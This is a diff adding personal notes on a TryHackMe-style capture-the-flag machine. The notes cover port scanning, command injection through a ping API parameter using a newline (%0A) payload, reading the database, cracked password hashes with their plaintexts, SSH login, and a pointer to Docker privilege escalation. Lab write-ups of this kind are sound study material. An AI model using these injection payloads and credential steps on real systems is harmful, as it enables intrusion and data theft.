@@ -1,0 +1,65 @@
+10.10.197.115
+
+nmap -sC -sV scan:
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
+|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
+|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
+8081/tcp open  http    Node.js Express framework
+|_http-cors: HEAD GET POST PUT DELETE PATCH
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Webpage on 8081 seems to be an api
+
+another port after doing every port scan
+
+31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+http://10.10.197.115:31331/
+
+ultratech@yopmail.com
+
+after doing some digging around we found that there is an api.js file
+that has some code suggesting the website is pinging the api using the 'ping'
+command to check the api is still active. however this is extremely dangerous as it works by using:
+
+http://10.10.197.115:8081/ping?ip=10.11.93.140
+
+adding a nullbyte to this allows for command injection...  '%0A'
+
+so to ls the directory:
+
+http://10.10.197.115:8081/ping?ip=10.11.93.140%0Als
+
+we get the directory:
+
+ index.js node_modules package.json package-lock.json start.sh utech.db.sqlite 
+
+using the previous method we can cat the db which gives some password hashes...
+
+f357a0c52799563c7c7b76c1e7543a32 - 	n100906
+0d0ea5111e3c1def594c1684e3b9be84 -  mrsheafy
+
+with the username 'admin' and the password 'mrsheafy' we can login to the webpage '/partners.html'
+
+we get prompted with: 
+
+Restricted area
+
+Hey r00t, can you please have a look at the server's configuration?
+The intern did it and I don't really trust him.
+Thanks!
+
+lp1
+
+we were able to ssh into the machine as user 'r00t' and password: 'n100906'
+
+priveledge escalation can be achieved through docker:
+
+explanation into docker priviledg escalation: 
+https://middleoftheweb.com/2020/11/10/tryhackme-ultratech/ 
